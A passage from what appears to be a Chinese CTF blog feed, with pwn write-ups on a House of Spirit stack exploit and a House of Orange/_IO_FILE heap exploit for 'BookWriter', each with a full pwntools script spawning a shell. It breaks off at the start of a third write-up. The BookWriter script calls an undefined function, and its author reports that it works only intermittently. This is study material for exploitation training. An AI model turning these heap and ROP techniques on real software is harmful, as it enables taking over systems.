cnt);</span><br></pre></td></tr></table></figure></li>
<li>那么对应的对<code>s</code>的输入可以溢出到<code>v5</code>和<code>buf</code>，这里可以将栈上的libc，stack以及heap address全部都leak出来：  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;s, nbytes);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;s);</span><br></pre></td></tr></table></figure></li>
<li>地址leak出来之后，就可以在栈上<code>v7</code>的区域伪造出fake fastbin以及next chunk size，之后它会被<code>free</code>到fastbin中</li>
<li>下一次的malloc就能分配到栈上的地址空间，由于这个时候<code>nbytes=0x68</code>，并且这个fake chunk距离栈上的return address的offset只有0x4c，所以这里我采用的是写rop的方法，构造<code>system(&quot;/bin/sh&quot;);</code>，从而在从<code>survey</code>返回地时候触发来getshell。</li>
</ul>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">survey</span><span class="params">(name, age, reason, comment)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">""</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Please enter your name: "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter your age: "</span>, str(age))</span><br><span class="line">    p.sendafter(<span class="string">"Why did you came to see this movie? "</span>, reason)</span><br><span class="line">    <span class="keyword">if</span> comment != <span class="string">""</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Please enter your comment: "</span>, comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>, choice)</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">heap_offset = <span class="number">0x410</span></span><br><span class="line">stack_offset = <span class="number">0x1eaf8</span></span><br><span class="line">stdout_offset = <span class="number">0x1b0d60</span></span><br><span class="line">ebp_offset = <span class="number">0x1ead8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make cnt to 100</span></span><br><span class="line"><span class="comment"># thus, overwrite the value of 'nbytes' to ord('n') </span></span><br><span class="line"><span class="comment"># because len("100 comment so far. We will review them as soon as we can") will be 57</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    survey(<span class="string">"AAAA"</span>, <span class="number">1</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">    keep(<span class="string">"y"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    survey(<span class="string">""</span>, <span class="number">1</span>, <span class="string">"AAAA"</span>, <span class="string">""</span>)</span><br><span class="line">    keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap, stack and libc address</span></span><br><span class="line">survey(<span class="string">"BBBB"</span>, <span class="number">1</span>, <span class="string">"B"</span> * <span class="number">0x4b</span> + <span class="string">"stack"</span>, <span class="string">"B"</span> * <span class="number">0x50</span> + <span class="string">"heap"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"heap"</span>)</span><br><span class="line">heap_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">heap_base = heap_addr - heap_offset</span><br><span class="line">p.recvuntil(<span class="string">"stack"</span>)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">stack_base = stack_addr - stack_offset</span><br><span class="line">stack_ebp = stack_base + ebp_offset</span><br><span class="line">libc_stdout = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</span><br><span class="line">libc_base = libc_stdout - stdout_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake a fastbin near return address</span></span><br><span class="line"><span class="comment"># make sure the next chunk size can pass the check</span></span><br><span class="line"><span class="comment"># survey("CCCC", 1, p32(0) + p32(0x41) + "C" * 0x40 + p32(0) + p32(0x41), "C" * 0x54 + p32(stack_ebp - 0x40))</span></span><br><span class="line"><span class="comment"># keep("y")</span></span><br><span class="line">survey(<span class="string">"CCCC"</span>, <span class="number">1</span>, p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + <span class="string">"C"</span> * <span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>), <span class="string">"C"</span> * <span class="number">0x54</span> + p32(stack_ebp - <span class="number">0x48</span>))</span><br><span class="line">keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite return address to construct rop chain</span></span><br><span class="line">payload = <span class="string">"D"</span> * <span class="number">0x48</span></span><br><span class="line">payload += flat([<span class="number">0xdeadbeef</span>, libc_system, <span class="number">0xdeadbeef</span>, str_bin_sh])</span><br><span class="line">survey(payload, <span class="number">1</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">keep(<span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"stack_base: "</span> + hex(stack_base))</span><br><span class="line">success(<span class="string">"stack_ebp: "</span> + hex(stack_ebp))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>很基本的House of spirit attack，主要是了解一下原理以及一些check的pass</li>
<li>我能想到的最简单的就是rop了，不知道还有没有其他姿势</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>都是House of spirit的原理分析：</p>
<ol>
<li><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a></li>
<li><a href="https://www.cnblogs.com/luoleqi/p/12357190.html" target="_blank" rel="noopener">https://www.cnblogs.com/luoleqi/p/12357190.html</a></li>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/</a></li>
</ol>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn heap: BookWriter</title>
    <url>/2020/04/09/pwn-heap-BookWriter/</url>
    <content><![CDATA[<p>典型的House of orange + unsorted bin attack + _IO_FILE，之前在<a href="https://n0nop.com/2020/02/07/pwn-heap-melody-center/">melody_center</a>中有写过，基本是一样的，除了一些利用的细节。权当是练习了，毕竟第一次接触的时候，写起来有点吃力。</p>
<a id="more"></a>

<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64程序，保护除了<code>PIE</code>全开：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>题目提供了五个功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------------------</span><br><span class="line">      BookWriter      </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add a page        </span><br><span class="line"> 2. View a page       </span><br><span class="line"> 3. Edit a page       </span><br><span class="line"> 4. Information       </span><br><span class="line"> 5. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>
<p>最开始的时候会要求输入author name。<br><br><code>add</code>功能就是添加一个page，地址和大小分别存在bss上两个数组里面。<br><br><code>view</code>功能就是输出一个给定page的内容。<br><br><code>edit</code>功能就是修改一个给定page的内容，但是这里会重新根据<code>strlen(content)</code>来修改之前提到的bss上存大小的数组里，从而影响下一次可以读入的字节数。<br><br><code>info</code>功能就是输出author name, page数量，以及提供更改author name的选择。</p>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h2><p>House of orange攻击的核心，就是在没有free函数的情况下，释放出一个unsorted bin供利用，而主要的原理就是利用top chunk。<br><br>一般在可以overwrite top chunk size的情况下，请求malloc一个比伪造的top chunk size更大的空间时。在<code>_int_malloc</code>检验fastbin, smallbin, unsorted bin, large bin没有找到符合需求的块时，接下俩<code>_int_malloc</code>会试图从top chunk切，如果top chunk的空间也不够，那么会执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时<code>ptmalloc</code>已经不能满足用户申请堆内存的操作，需要执行<code>sysmalloc</code>来向系统申请更多的空间。但是对于堆来说有<code>mmap</code>和<code>brk</code>两种分配方式，我们需要让堆以<code>brk</code>的形式拓展，之后原有的top chunk会被置于unsorted bin中。<br><br>综上，我们要实现<code>brk</code>拓展top chunk，但是要实现这个目的需要绕过一些libc中的check。首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure>
<p>如果所需分配的chunk大小大于<code>mmap</code>分配阈值，默认为<code>128K</code>，并且当前进程使用<code>mmap()</code>分配的内存块小于设定的最大值，将使用<code>mmap()</code>系统调用直接向操作系统申请内存。<br><br>此外，在<code>sysmalloc</code>函数中存在对top chunk size的check，如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) </span><br><span class="line">        || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE </span><br><span class="line">        &amp;&amp; prev_inuse(old_top) </span><br><span class="line">        &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>
<p>这里检查了top chunk的合法性：</p>
<ul>
<li>如果第一次调用本函数，top chunk可能没有初始化，所以可能<code>old_size</code>为 0。 </li>
<li>如果top chunk已经初始化了，那么top chunk的大小必须大于等于<code>MINSIZE</code>，因为top chunk中包含了 fencepost，所以top chunk的大小必须要大于<code>MINSIZE</code>。</li>
<li>其次top chunk必须标识前一个chunk处于inuse状态.</li>
<li>并且top chunk的结束地址必定是页对齐的。</li>
<li>此外top chunk除去fencepost的大小必定要小于所需chunk的大小，否则在<code>_int_malloc</code>函数中会使用top chunk分割出chunk。<br><br>因此伪造的top chunk size需要满足：</li>
<li>伪造的size必须要对齐到内存页(0x1000)</li>
<li>size要大于<code>MINSIZE(0x10)</code></li>
<li>size要小于之后申请的<code>chunk size + MINSIZE(0x10)</code></li>
<li>size的<code>prev inuse</code>位必须为 1</li>
</ul>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>unsorted bins是一个双向链表，它采用的遍历顺序是FIFO，即插入时插在头部，取出时从尾部取。<br><br>当响应内存分配请求时，若small bin中不含符合要求的块，那么此时就会从unsorted bins中查找，如果有符合要求的，就会被取出来使用，其余的根据大小分别放在不同的bin中。<br><br>从unsorted bins中取块时，会将改该unsorted bin的bck-&gt;fd写为unsorted bins的地址（glibc2.23的版本下是<code>main_arena+0x58</code>，以后提及“unsorted bins的地址”，均用<code>main_arena+0x58</code>代替）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* remove from unsorted list *&#x2F;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</span><br><span class="line">    malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>于是只要伪造unsorted bin的bk的值，就能将<code>main_arena+0x58</code>写到bk的fd处。</p>
<p><img src="/2020/04/09/pwn-heap-BookWriter/unsorted_bin_attack_order.png" alt="unsorted bin attack"></p>
<p>事实上，一般在配合House of orange的情况下，一般会选择将<code>_IO_list_all</code>更改为<code>main_arena+0x58</code>，而此时<code>_IO_list_all-&gt;_chains</code>正好指向<code>main_arena</code>中size为0x60的smallbin。</p>
<h2 id="fake-IO-FILE-and-vtable"><a href="#fake-IO-FILE-and-vtable" class="headerlink" title="fake _IO_FILE and vtable"></a>fake _IO_FILE and vtable</h2><p>前面提到<code>_IO_list_all-&gt;_chains</code>正好指向<code>main_arena</code>中size为0x60的smallbin，那么只要伪造出对应的smallbin为<code>struct _IO_FILE</code>以及伪造出相应的<code>vtable</code>地址以及<code>vtable</code>内容，就可以达到getshell的目的。<br><br>因为这题是glibc2.23，所以不存在对vtable的check，所以vtable也可以随意构造。至于更高的glibc版本（如glibc2.24），存在一些相应的对vtable的检查机制，构造vtable会有困难，解决方案可以参考<a href="https://n0nop.com/2020/02/07/pwn-heap-melody-center/#利用思路">melody_center</a>。<br><br>对于<code>_IO_FILE</code>的构造，需要满足以下条件：</p>
<ul>
<li><code>fp-&gt;_mode</code> = 0</li>
<li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li>
<li><code>fp-&gt;_IO_read_ptr</code> = 0x61                     smallbin with size 0x60</li>
<li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all-0x10</code>     _IO_list_all ==&gt; main_arena+0x58</li>
<li><code>vtable-&gt;_IO_OVERFLOW</code> = <code>system</code>             _IO_OVERFLOW(fp);</li>
<li><code>fp</code> start with “/bin/sh\x00”<br><br>显然对于glibc2.24中利用<code>_IO_str_jumps</code>的方法，对于glibc2.23同样适用。</li>
</ul>
<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
<li><code>edit</code>功能中由于会根据<code>strlen</code>重新设置可读入的长度，因此可以在长度包含next chunk的size域的时候，可以完成对next chunk的size字段的修改，这里是更改top chunk的size，使其在下一次分配更大的空间的时候，被free到unsorted bin中。</li>
<li>由于malloc出的chunk里的内容不会被清0，因此在从unsorted bin中分配内存时，只要将原fd字段用字符填满，即可利用<code>view</code>功能leak出bk处的<code>main_arena</code>相关地址，从而得到libc的基地址。</li>
<li><code>add</code>功能中对个数判断存在漏洞，即bss上的储存chunk的空间只有8个，而这里可以分配第九个也就是<code>chunk_array[8]</code>，而<code>chunk_array[8]</code>其实就是<code>chunk_size[0]</code>，只要利用<code>edit</code>功能中对size的改写将<code>chunk_size[0]</code>变为0（通过输入’\x00’开头可以做到），就可以将<code>chunk_size[0]</code>overwrite为堆地址，从而可以接受更多输入，这一点很重要，因为后面修改伪造<code>_IO_FILE</code>，<code>vtable</code>以及smallbin需要用到。  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't add new page anymore!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>接下来就是构造<code>_IO_FILE</code>结构体了，因为这里没有选择leak heap address，也就没有选择在堆块中伪造<code>vtable</code>，还是选择利用<code>_IO_str_jumps</code><del>其实就是偷个懒，用一下之前写过的脚本</del>。其实可以通过author name把紧跟着的<code>chunk_array[0]</code>打印出来，然后伪造<code>vtable</code>，然后利用<code>_IO_OVERFLOW(fp)</code>…</li>
</ul>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"Author :"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size of page :"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index of page :"</span>, str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index of page :"</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"Content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(choice, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Do you want to change the author ? (yes:1 / no:0) "</span>, str(choice))</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Author :"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">                  p32(<span class="number">0</span>) + \</span><br><span class="line">                  p64(_IO_read_ptr) + \</span><br><span class="line">                  p64(_IO_read_end) + \</span><br><span class="line">                  p64(_IO_read_base) + \</span><br><span class="line">                  p64(_IO_write_base) + \</span><br><span class="line">                  p64(_IO_write_ptr) + \</span><br><span class="line">                  p64(_IO_write_end) + \</span><br><span class="line">                  p64(_IO_buf_base) + \</span><br><span class="line">                  p64(_IO_buf_end) + \</span><br><span class="line">                  p64(_IO_save_base) + \</span><br><span class="line">                  p64(_IO_backup_base) + \</span><br><span class="line">                  p64(_IO_save_end) + \</span><br><span class="line">                  p64(_IO_marker) + \</span><br><span class="line">                  p64(_IO_chain) + \</span><br><span class="line">                  p32(_fileno)</span><br><span class="line">      </span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_with_vtable</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin5file_size</span></span><br><span class="line">                        _IO_read_end = main_arena_addr,</span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr - <span class="number">0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">    payload += p64(_IO_str_jumps_addr - <span class="number">8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">_IO_list_all_offset = libc.symbols[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">_IO_str_jumps_offset = <span class="number">0x3c27a0</span></span><br><span class="line"></span><br><span class="line">set_name(<span class="string">"AAA"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># House of orange</span></span><br><span class="line"><span class="comment"># overwrite top chunk size</span></span><br><span class="line"><span class="comment"># make the chunk_size[0] = 0</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x00"</span> * <span class="number">0x38</span> + <span class="string">"\xc1\x0f\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free a unsorted bin</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc from unsorted bin</span></span><br><span class="line"><span class="comment"># leak main_arena address</span></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">"C"</span> * <span class="number">8</span>) <span class="comment"># chunk 2</span></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"C"</span> * <span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset - <span class="number">0x668</span></span><br><span class="line">_IO_list_all = libc_base + _IO_list_all_offset</span><br><span class="line">_IO_str_jumps = libc_base + _IO_str_jumps_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc left 5 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">"DDDD"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite chunk_size[0] to a heap address</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"EEEE"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake _IO_FILE struct </span></span><br><span class="line"><span class="comment"># make sure chunk_size[0] = 0 again, so that we can malloc once again to trigger error</span></span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">0x1f0</span></span><br><span class="line">payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena - <span class="number">0x610</span>, libc_system, str_bin_sh)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger error</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size of page :"</span>, str(<span class="number">0x18</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"_IO_list_all: "</span> + hex(_IO_list_all))</span><br><span class="line">success(<span class="string">"_IO_str_jumps: "</span> + hex(_IO_str_jumps))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>很奇怪，本地还是打不通，明明都断在<code>system</code>里面了，参数<code>rdi</code>也是对的，而且远程也是概率性打通。</li>
<li>调试的时候，leak出来的libc地址不是预期的<code>main_arena+0x58</code>的值，而是会大0x610，还没搞清楚原因。</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/</a></li>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></li>
<li><a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">https://xz.aliyun.com/t/2411</a></li>
</ol>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn rop: babystack</title>
    <url>/2020/04/09/pwn-rop-babystack/</url>
    <content><![CDATA[<p>其实挺简单的一个rop题目，本来不想写这个wp，感觉没必要，因为除了爆破就是爆破，还爆了十多分钟。但是因为不想直接one_gadget还想了有一段时间怎么写rop，最后还是写出来了，成功打通，索性记录一下。</p>
<a id="more"></a>

<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64程序，保护全开：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>就两个功能，一个<code>login</code>，要求输入password比较通过后才能开启<code>copy</code>功能：</p>
